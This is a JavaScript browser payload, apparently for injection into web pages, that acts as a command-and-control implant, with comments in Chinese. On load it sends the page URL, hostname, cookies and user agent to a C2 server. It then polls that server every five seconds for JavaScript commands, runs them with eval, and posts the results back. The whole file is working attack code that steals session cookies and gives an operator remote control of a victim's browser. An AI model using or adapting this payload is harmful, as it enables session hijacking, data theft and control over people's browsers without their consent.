// ==================== first_payload.js (完整正確版) ====================

const C2_SERVER = 'http://127.0.0.1:8964';
const C2_CONTROL_API = "/api/control/add_message";
const C2_GET_COMMAND_API = "/api/control/get_command";
const C2_SEND_RESULT_API = "/api/control/send_result";
// 這是你丟失的 register 函數！
async function register() {
    const data = new FormData();
    const target_info = {
        where: window.location.href,
        hostname: window.location.hostname,
        cookie: document.cookie,
        user_agent: navigator.userAgent,
        time_stamp: new Date().toISOString()
    };
    data.append("message", JSON.stringify(target_info));
    data.append("target_ip", window.location.hostname);
    try {
        const response = await fetch(`${C2_SERVER}${C2_CONTROL_API}`, {
            method: 'POST',
            body: data
        });
        if (response.ok) {
            console.log("C2註冊成功", response.status);
        } else {
            console.error("C2註冊失敗", response.status);
        }
    } catch (error) {
        console.error("C2註冊失敗", error);
    }
}

// 這是唯一的、正確的 get_command 函數！
async function get_command() {
    try {
        const command_path = `${C2_SERVER}${C2_GET_COMMAND_API}?zombie_ip=${window.location.hostname}`;
        const response = await fetch(command_path);

        if (!response.ok) {
            throw new Error(`伺服器錯誤: ${response.status}`);
        }

        return await response.json();
    } catch (error) {
        console.error("get_command 內部錯誤:", error);
        throw error; // 向上拋出，讓調用者知道出錯了
    }
}

// 修正後的 send_result 函數 - 使用正確的 API 和字段
async function send_result(result) {
    try {
        const data = new FormData();
        // 使用 'result' 字段，而不是 'message'
        data.append("result", JSON.stringify(result));

        // 使用專門的 send_result API
        const response = await fetch(`${C2_SERVER}${C2_SEND_RESULT_API}`, {
            method: 'POST',
            body: data
        });

        if (response.ok) {
            console.log("結果發送成功", response.status);
        } else {
            console.error("結果發送失敗", response.status);
        }
    } catch (error) {
        console.error("發送結果時發生錯誤:", error);
    }
}

// 這是唯一的、正確的 execute_command 函數！
async function execute_command() {
    try {
        const command_data = await get_command();

        // 用 'data' 來開箱！
        if (command_data && command_data.data && command_data.data !== '沒有命令') {
            console.log("收到並執行命令:", command_data.data);

            let execution_result = {
                command: command_data.data,
                timestamp: new Date().toISOString(),
                success: false,
                output: null,
                error: null
            };

            try {
                // 捕獲 eval 的執行結果
                const result = eval(command_data.data);
                execution_result.success = true;
                execution_result.output = result !== undefined ? String(result) : "命令執行成功，無返回值";
            } catch (evalError) {
                execution_result.success = false;
                execution_result.error = String(evalError);
                console.error("命令執行失敗:", evalError);
            }

            // 發送執行結果
            await send_result(execution_result);
        } else {
            console.log("無新命令...");
        }
    } catch (error) {
        console.error("execute_command 執行鏈路失敗:", error);
        // 即使在獲取命令時失敗，也發送錯誤報告
        await send_result({
            command: "GET_COMMAND_ERROR",
            timestamp: new Date().toISOString(),
            success: false,
            error: String(error)
        });
    }
}

// --- 主程序入口 ---
console.log("Payload V3.1 已載入，開始註冊並啟動心跳...");
register();
setInterval(execute_command, 5000); // 把間隔改長一點，5秒，別把你自己的伺服器DDoS了

// =======================================================================